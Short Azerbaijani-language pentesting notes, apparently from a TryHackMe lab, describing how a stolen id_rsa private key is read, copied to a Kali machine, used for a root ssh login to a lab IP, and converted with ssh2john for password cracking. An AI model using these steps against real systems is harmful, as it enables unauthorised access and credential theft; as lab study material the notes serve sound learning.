## eger hansisa sistemin id-rsa varsa biz artiq hemin sisteme oz atack masinimizda ip adresi ile daxil ola bileriq root kimi 
## (USERDE)
## evvelce biz cat verib hemid id rsa oxuyuruq
## sorna  biz oz atack masinimiza kecirik ve NANO ILE HEMID FAYL ADINDA BIR FAYL YARADIRIQ VE HEMID YAZINI BURA DAXIL edirik
## (KALIDE)'
    ssh -i (ID_RSA-ADINI) -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.146.185

## VE ARTIQ ROOT KIMI DAXIL OLMUSUQ    
    
# vi emrinden istifade ederken idrsa fileni
     vi id_rsa 
     i duymesini klikleyirik
     daha sonra ctrl V duymesi vasitesi ile paste edirik copy elediyimizi 
     ( shift + : )  bu duymeleri klikledikden sonra wq yaziriq 

# daha sonra
    ssh2john emri ile 
    ssh2john id_rsa > hash
    # file johnun qirabileceyi formaya getirir
 ## bu linkvasitesi ile baxa bilerik
 https://buraksevben.medium.com/tryhackme-basic-pentesting-solution-turkish-242b935df5dc 
 
